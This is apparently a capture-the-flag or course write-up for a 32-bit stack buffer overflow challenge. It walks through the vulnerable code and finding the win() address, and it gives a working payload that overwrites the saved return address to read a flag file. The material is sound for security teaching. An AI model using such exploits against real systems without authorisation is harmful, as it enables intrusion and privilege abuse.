# Mission0 ~ buffer overflow
## Goal and instructions
Connect to bin.chall.necst.it port 22 via SSH as user [USERNAME]. You will find the files in /home/[USERNAME]/mission0.

Your goal is to read the file flag with the privileges of the group that owns the vulnerable binary.
## compiled options
The executable program is compiled in 32bit, the stack is executable and the canary is inactive.
```
gcc -fno-stack-protector -m32 -no-pie -O0 -o mission0 mission0.c
```
## Code overview
With the instruction system("cat flag") is possible to open the file flag with the same privileges as the vulnerable binary, this instruction is already in the following function, but it is never called. 
```
void win()
{
      puts("Please take your pizza");
      system("cat flag");
      exit(0);
}
```
The code contains an additional control on the input string, which must contain the substring "pie!".
```
if (strncmp(buf, "pie!", 4) == 0)
{
  // A real fan. You can return back.
  puts("Every minute, every second, buy, buy, buy, buy, buy.");
  return 0;
}
else
{
  // No way. I can't "return" from this point.
  puts("You're not a fan. You are imprisoned forever.");
  exit(1);
}
```
> **note:** The buffer (input string) has a variable length for each student, 168 in our case.


## Solution
The exploit is a classical [buffer overflow](https://it.wikipedia.org/wiki/Buffer_overflow) on the buffer, the goal is to overwrite the value saved in the save EIP register (function return address) with the address of the win() function.
> **note:** Saved eip is locate on EBP + 4

In order to write a valid exploit it is necessary to:
  * Find the win() function address in the executable, with the following command:
  ```
  objdump -d mission0 Mintel
  ```
  \xcb\x84\x04\x08 in hex in our case.
  * Include the required substring in the input buffer (pie! wrote in hex is \x70\x69\x65\x21).
  * Locate the buffer address on the stack, and measure the distance from the EIP, this distance will be filled with nop operations (or other characters).

The final exploit must include, in order, the required substring, enough character to overwrite the save EIP and the jumping address as follow:
```
python -c "print '\x70\x69\x65\x21' + '\x90' * 173 + '\xcb\x84\x04\x08'" | ./mission0
```